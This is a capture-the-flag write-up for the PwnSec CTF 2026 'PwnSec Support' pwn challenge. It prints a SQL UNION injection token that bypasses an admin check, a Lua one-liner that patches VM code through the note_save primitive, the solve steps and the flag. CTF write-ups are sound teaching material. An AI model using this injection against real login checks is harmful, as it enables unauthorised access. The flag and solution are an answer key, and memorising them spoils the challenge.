# PwnSec Support

> Spoiler warning: This document contains the analysis and complete solution.

## Overview

| Field | Value |
|---|---|
| Status | solved |
| Event or platform | PwnSec CTF 2026 |
| Category | pwn |
| Difficulty | Hard |
| Flag format | `pwnsec{...}` |

The service runs Lua 5.5 and a ticket portal on a custom 32-bit ISA. The decisive observation is that SQL injection in `/admin` grants access to a Lua console, where the exposed `note_save` primitive can patch writable code and return the flag placed after a randomized `FLAGPAD` as a Lua string.

## Environment and Initial Analysis

The official inputs are [public.zip](../challenge/public.zip), [l3afvm](../challenge/l3afvm), and [ctf_sql.l3af](../challenge/ctf_sql.l3af). The shared competition environment is restored from [requirements.txt](../../../requirements.txt) and uses Python 3.12.10. `l3afvm` is a stripped x86-64 PIE with NX and GNU RELRO enabled.

`ctf_sql.l3af` contains L3afVM instructions and data as NDJSON. Recovering its `DATA_BYTES` objects reveals the Lua application and SQL engine source. The extracted modules are preserved in [analysis/lua](../analysis/lua).

The supplied binary requests `sqrtf@GLIBC_2.43`, which is incompatible with its Debian bookworm Dockerfile. I preserved the original and changed only the ELF symbol-version mapping in [l3afvm.compat](../analysis/l3afvm.compat) to reproduce the service locally. Its `--trace` load map was:

```text
data=0x00010000..0x003f9d04 code=0x003f9d10..0x006b2fd0 (178476 instructions)
```

The local image contains `pwnsec{test_local_build}`, an explicit test value that was not treated as the remote flag.

## Core Analysis

`check_admin()` directly concatenates `token` into this SQL query:

```sql
SELECT u.id, u.username FROM sessions s, users u
WHERE s.token = '<token>' AND s.user_id = u.id AND u.is_admin = 1
```

Because `sessions` starts empty, a simple `OR` does not create a result row. This token uses `UNION` to supply the two columns expected by the function:

```sql
' UNION SELECT 1, 'root' FROM users -- 
```

The resulting admin console executes `load(code)` and exposes the C function `note_save(address, value)`. It stores a 32-bit word at a VM address, while guest code and data share writable memory.

Each instance changes the `FLAGPAD` size, so absolute addresses vary, but the relative layout does not. For `n = address(note_save)`:

```text
code_base = n - 0x4150
FLAG      = code_base - 0x24 = n - 0x4174
patch     = code_base + 0x50c0 + 8 = n + 0xf78
```

`patch` is the immediate word of the `LC` instruction that supplies the buffer pointer to `lua_pushlstring` in `rand_hex()`. Redirecting it to `FLAG` makes `rand_hex(24)` return the actual 24-byte flag:

```lua
local n=tonumber(tostring(note_save):match("(%x+)$"),16);note_save(n+0xf78,n-0x4174);print(rand_hex(24))
```

The same relative-address payload returned both the local test flag and the remote flag, validating the layout model. Additional evidence is recorded in [observations.md](../analysis/observations.md).

## Solution and Reproduction

[solve.py](../solve.py) reads the `main` URL from [instance.json](../instance.json) and automates the full path:

1. POST the SQL `UNION` token and Lua patch to `/admin`.
2. Validate and extract only the `pwnsec{...}` value from the Lua output.
3. On success, write only the flag bytes to stdout without a newline.

Activate the competition `.venv` and run from the challenge root:

```bash
python -m pip install -r ../../requirements.txt
python -m pip check
python solve.py
```

## Result

`python solve.py` exits with code 0, leaves stderr empty, and its stdout bytes match [flag](../flag).

```text
pwnsec{3644e5ca073c4089}
```

## Takeaways

An `OR` authentication bypass cannot produce rows through an empty joined table, but `UNION` can construct the required result shape directly. Address randomization also does not prevent exploitation when a leaked function address and stable intra-image offsets yield a position-independent guest-memory patch. Writable code combined with an arbitrary word write provided the final flag-read primitive.

## References

No external references were used. The analysis used only the official handout, `readelf`, `objdump`, L3afVM `--trace`, Python 3.12.10, and `curl`.
